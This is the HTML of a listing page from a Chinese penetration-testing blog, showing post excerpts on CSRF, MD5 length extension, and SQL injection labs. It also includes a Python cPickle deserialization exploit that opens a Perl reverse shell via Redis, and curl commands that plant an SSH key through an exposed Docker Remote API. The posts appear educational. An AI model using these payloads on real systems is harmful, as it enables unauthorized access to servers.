@@ -1,0 +1,659 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 15 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>😊#<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		wubba lubba dub dub.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/08/29/csrf.html" >CSRF</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-08-29  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
+<p>如果要跨域请求，有下面的限制：</p>
+<ul>
+<li>仅允许GET、HEAD、POST请求</li>
+<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
+<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
+</ul>
+<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
+<ul>
+<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
+</ul>
+<blockquote>
+<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
+</blockquote>
+<ul>
+<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
+</ul>
+<blockquote>
+<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:
+
+var xhr &#x3D; new XMLHttpRequest();
+xhr.open(&#39;GET&#39;, url, true);
+xhr.withCredentials &#x3D; true;
+xhr.onreadystatechange &#x3D; handler;
+xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
+<p>如果要跨域请求，有下面的限制：</p>
+<ul>
+<li>仅允许GET、HEAD、POST请求</li>
+<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
+<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
+</ul>
+<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
+<ul>
+<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
+</ul>
+<blockquote>
+<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
+</blockquote>
+<ul>
+<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
+</ul>
+<blockquote>
+<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:
+
+var xhr &#x3D; new XMLHttpRequest();
+xhr.open(&#39;GET&#39;, url, true);
+xhr.withCredentials &#x3D; true;
+xhr.onreadystatechange &#x3D; handler;
+xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/07/26/python-cpickle-shell.html" >Python cPickle 反序列化shell</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-07-26  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
+<blockquote>
+<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
+</blockquote>
+<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
+<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+import cPickle
+import os
+import redis
+
+class exp(object):
+    def __reduce__(self):
+        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
+        return (os.system, (s,))
+   
+e &#x3D; exp()
+s &#x3D; cPickle.dumps(e)
+
+r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
+r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
+<blockquote>
+<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
+</blockquote>
+<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
+<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+import cPickle
+import os
+import redis
+
+class exp(object):
+    def __reduce__(self):
+        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
+        return (os.system, (s,))
+   
+e &#x3D; exp()
+s &#x3D; cPickle.dumps(e)
+
+r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
+r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
+
+	
+	</div>
+  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/07/25/hash-length-attack.html" >MD5哈希长度扩展攻击</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-07-25  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
+</blockquote>
+<p>这篇文章里有提到的哈希长度扩展攻击看了下做个笔记。理解哈希长度扩展攻击以md5为例，需要理解下面几点：</p>
+<h3 id="MD5的部分工作原理"><a href="#MD5的部分工作原理" class="headerlink" title="MD5的部分工作原理"></a>MD5的<strong>部分工作原理</strong></h3><h4 id="一-先看下MD5的计算过程，只需要理解一半："><a href="#一-先看下MD5的计算过程，只需要理解一半：" class="headerlink" title="一. 先看下MD5的计算过程，只需要理解一半："></a>一. 先看下MD5的计算过程，只需要理解一半：</h4><p> 对于一个message进行md5计算的过程是这样的：<br> 经过三个步骤，这部分可以看<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
+<p> The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   先进行补位，使得整体长度对512取模之后的值为448，len(message)%512 == 418，计算单位是bit（位）。</p>
+<ol>
+<li><p>Append Padding Bits</p>
+<p> 补位是这样的，先在message后面加0x80标识，然后加无限个0，一直满足对512bit取模之后等于448bit。</p>
+</li>
+<li><p>Append Length</p>
+<p> 512bit和448相差64bit，即8Byte，这个8字节用来表示补位之前message的长度。</p>
+</li>
+<li><p>计算消息摘</p>
+<p>有一个初始链变量，用来参与第一轮的运算，MD5的初始变量为：<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
+</li>
+</ol>
+<p> 整体来说就是先补位，然后补长度，这个长度占8Byte，用来表示补位之前message的长度，然后计算md5。现在记住下面这句话：</p>
+<blockquote>
+<p>每经过一次消息摘要计算，上面的<strong>链变量会被新的值覆盖</strong>，最后一轮经过高低位互换（aabbccdd -&gt; ddccbbaa）就是最终的MD5值。</p>
+</blockquote>
+<p>现在来进行md5扩展长度攻击：<br>我觉得直接把这个看完就差不多了：<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
+	
+
+	</div>
+  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
+</blockquote>
+<p>这篇文章里有提到的哈希长度扩展攻击看了下做个笔记。理解哈希长度扩展攻击以md5为例，需要理解下面几点：</p>
+<h3 id="MD5的部分工作原理"><a href="#MD5的部分工作原理" class="headerlink" title="MD5的部分工作原理"></a>MD5的<strong>部分工作原理</strong></h3><h4 id="一-先看下MD5的计算过程，只需要理解一半："><a href="#一-先看下MD5的计算过程，只需要理解一半：" class="headerlink" title="一. 先看下MD5的计算过程，只需要理解一半："></a>一. 先看下MD5的计算过程，只需要理解一半：</h4><p> 对于一个message进行md5计算的过程是这样的：<br> 经过三个步骤，这部分可以看<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
+<p> The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   先进行补位，使得整体长度对512取模之后的值为448，len(message)%512 == 418，计算单位是bit（位）。</p>
+<ol>
+<li><p>Append Padding Bits</p>
+<p> 补位是这样的，先在message后面加0x80标识，然后加无限个0，一直满足对512bit取模之后等于448bit。</p>
+</li>
+<li><p>Append Length</p>
+<p> 512bit和448相差64bit，即8Byte，这个8字节用来表示补位之前message的长度。</p>
+</li>
+<li><p>计算消息摘</p>
+<p>有一个初始链变量，用来参与第一轮的运算，MD5的初始变量为：<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
+</li>
+</ol>
+<p> 整体来说就是先补位，然后补长度，这个长度占8Byte，用来表示补位之前message的长度，然后计算md5。现在记住下面这句话：</p>
+<blockquote>
+<p>每经过一次消息摘要计算，上面的<strong>链变量会被新的值覆盖</strong>，最后一轮经过高低位互换（aabbccdd -&gt; ddccbbaa）就是最终的MD5值。</p>
+</blockquote>
+<p>现在来进行md5扩展长度攻击：<br>我觉得直接把这个看完就差不多了：<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
+	
+	</div>
+  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/05/18/docker-remote-exploit.html" >Docker Remote API Exploit</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-05-18  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Source:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
+<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
+</ul>
+<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
+<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
+<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
+<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
+<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
+<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
+	
+
+	</div>
+  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Source:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
+<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
+</ul>
+<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
+<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
+<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
+<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
+<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
+<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
+	
+	</div>
+  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/05/05/sqli-labs-less-16.html" >SQL报错注入</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-05-05  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="注入的方法"><a href="#注入的方法" class="headerlink" title="注入的方法"></a>注入的方法</h2><p>   <code>sqli-labs</code>的1，2，3，4课都可以使用以下四种来进行注入数据:</p>
+<ul>
+<li>Union select</li>
+<li>Error based</li>
+<li>Blind based</li>
+<li>Time blind based</li>
+</ul>
+<p>   对应的可以使用<code>sqlmap.py --technique </code>上面首字母大写来指定相应的注入类型。</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>   第五课首先排除union注入，因为页面无法显示数据，最后我还是看了网页源代码才注入的。</p>
+<blockquote>
+<p> 我发现sqlmap在每次注入的时候都会先尝试确定当前变量是被那种包含，然后在payload里面闭合，这样可以确保整个语句的完整性。 要么确定当前语句完全闭合，要么注释掉后面的语句，确保闭合。</p>
+</blockquote>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>   报错和union查询都出不了数据，只能进行盲注。bool blind和time blind。前面闭合可以使用<code>&#39;</code>或者<code>&#39;)</code>。</p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3>
+	
+
+	</div>
+  <a type="button" href="/2016/05/05/sqli-labs-less-16.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="注入的方法"><a href="#注入的方法" class="headerlink" title="注入的方法"></a>注入的方法</h2><p>   <code>sqli-labs</code>的1，2，3，4课都可以使用以下四种来进行注入数据:</p>
+<ul>
+<li>Union select</li>
+<li>Error based</li>
+<li>Blind based</li>
+<li>Time blind based</li>
+</ul>
+<p>   对应的可以使用<code>sqlmap.py --technique </code>上面首字母大写来指定相应的注入类型。</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>   第五课首先排除union注入，因为页面无法显示数据，最后我还是看了网页源代码才注入的。</p>
+<blockquote>
+<p> 我发现sqlmap在每次注入的时候都会先尝试确定当前变量是被那种包含，然后在payload里面闭合，这样可以确保整个语句的完整性。 要么确定当前语句完全闭合，要么注释掉后面的语句，确保闭合。</p>
+</blockquote>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>   报错和union查询都出不了数据，只能进行盲注。bool blind和time blind。前面闭合可以使用<code>&#39;</code>或者<code>&#39;)</code>。</p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3>
+	
+	</div>
+  <a type="button" href="/2016/05/05/sqli-labs-less-16.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/14/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/16/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+		
+			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+		
+			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+		
+			<li><a href="/categories/Python/">Python<span>5</span></a></li>
+		
+			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+		
+			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
+      </li>
+    
+      <li>
+        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
+      </li>
+    
+      <li>
+        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
+      </li>
+    
+      <li>
+        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
+      </li>
+    
+      <li>
+        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
